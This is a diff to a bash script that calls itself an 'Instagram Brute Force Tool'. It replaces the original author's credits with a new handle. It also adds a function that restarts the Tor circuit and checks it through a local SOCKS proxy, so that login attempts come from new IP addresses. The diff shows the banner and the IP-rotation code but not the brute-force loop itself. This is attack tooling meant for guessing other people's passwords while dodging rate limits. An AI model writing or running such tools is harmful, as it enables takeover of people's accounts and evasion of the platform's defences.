@@ -1,6 +1,6 @@
 #!/bin/bash
-# Coded by: github.com/dhasirar
-# Instagram: @dhasirar
+# Coded by: github.com/trh4ckn0n
+# Instagram: @trhacknon
 
 trap 'store;exit 1' 2
 string4=$(openssl rand -hex 32 | cut -c 1-4)
@@ -50,7 +50,7 @@ printf "\e[1;80m ) )| ||  _ \  /___)(_   _)(____ |  \e[0m\n"
 printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ |  \e[0m\n"
 printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|  \e[0m\n"
 printf "\n"
-printf "\e[1;50m\e[40m  Instagram Brute Force Tool by @dhasirar(IG)   \e[0m\n"
+printf "\e[1;50m\e[40m  Instagram Brute Force Tool by @trhacknon(IG)   \e[0m\n"
 printf "\n"
 }
 
@@ -117,10 +117,26 @@ fi
 
 
 function changeip() {
+  killall -HUP tor
+  sleep 3
+  check_new_ip
+}
 
-killall -HUP tor
+function check_new_ip() {
+  local max_attempts=5
+  local attempt=1
 
+  while [ $attempt -le $max_attempts ]; do
+    if curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; then
+      return 0
+    fi
+    printf "\e[1;91m[!] Tentative de reconnexion Tor %s/%s\e[0m\n" $attempt $max_attempts
+    sleep 2
+    ((attempt++))
+  done
 
+  printf "\e[1;91m[!] Impossible de se reconnecter à Tor\e[0m\n"
+  exit 1
 }
 
 function bruteforcer() {
